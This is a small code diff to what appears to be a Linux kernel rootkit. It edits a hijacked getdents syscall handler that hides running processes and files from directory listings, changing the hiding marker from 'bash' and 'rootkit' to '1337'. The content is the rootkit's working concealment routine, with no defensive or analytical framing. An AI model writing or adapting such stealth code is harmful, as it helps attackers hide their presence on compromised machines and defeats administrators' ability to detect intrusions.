@@ -57,13 +57,13 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 			filp_close(fcmdline, NULL);
 //			if (readnums != 0)
 //				printk("process cmdline %s\n", kbuf2);
-			if (readnums != 0 && strstr(kbuf2, "bash") != NULL) {
+			if (readnums != 0 && strstr(kbuf2, "1337") != NULL) {
 //				printk("File to hide %s\n", kbuf2);
 				pdirp->d_reclen += cdirp->d_reclen;
 			} else {
 				pdirp = cdirp;
 			}
-		} else if (strstr(cdirp->d_name,"rootkit") != NULL){
+		} else if (strstr(cdirp->d_name,"1337") != NULL){
 			if (pdirp == NULL)
 				dirp = (struct linux_dirent *)(start_offset + (long)(cdirp->d_reclen));
 			else
